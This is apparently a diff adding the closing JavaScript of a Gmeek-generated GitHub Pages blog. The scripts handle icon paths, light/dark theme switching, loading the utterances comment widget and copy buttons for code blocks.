+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var utterancesLoad=0;
+
+let themeSettings={
+    "dark": ["dark","moon","#00f0ff","dark-blue"],
+    "light": ["light","sun","#ff5000","github-light"],
+    "auto": ["auto","sync","","preferred-color-scheme"]
+};
+function changeTheme(mode, icon, color, utheme){
+    document.documentElement.setAttribute("data-color-mode",mode);
+    document.getElementById("themeSwitch").setAttribute("d",value=IconList[icon]);
+    document.getElementById("themeSwitch").parentNode.style.color=color;
+    if(utterancesLoad==1){utterancesTheme(utheme);}
+}
+function modeSwitch(){
+    let currentMode=document.documentElement.getAttribute('data-color-mode');
+    let newMode = currentMode === "light" ? "dark" : currentMode === "dark" ? "auto" : "light";
+    localStorage.setItem("meek_theme", newMode);
+    if(themeSettings[newMode]){
+        changeTheme(...themeSettings[newMode]);
+    }
+}
+function utterancesTheme(theme){
+    const message={type:'set-theme',theme: theme};
+    const iframe=document.getElementsByClassName('utterances-frame')[0];
+    iframe.contentWindow.postMessage(message,'https://utteranc.es');
+}
+if(themeSettings[theme]){changeTheme(...themeSettings[theme]);}
+console.log("\n %c Gmeek last https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","pingsag3/pingsag3.github.io");
+    script.setAttribute("issue-term","title");
+    
+    if(localStorage.getItem("meek_theme")=="dark"){script.setAttribute("theme","dark-blue");}
+    else if(localStorage.getItem("meek_theme")=="light") {script.setAttribute("theme","github-light");}
+    else{script.setAttribute("theme","preferred-color-scheme");}
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
+
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
+
+</script>
+
+
+</html>
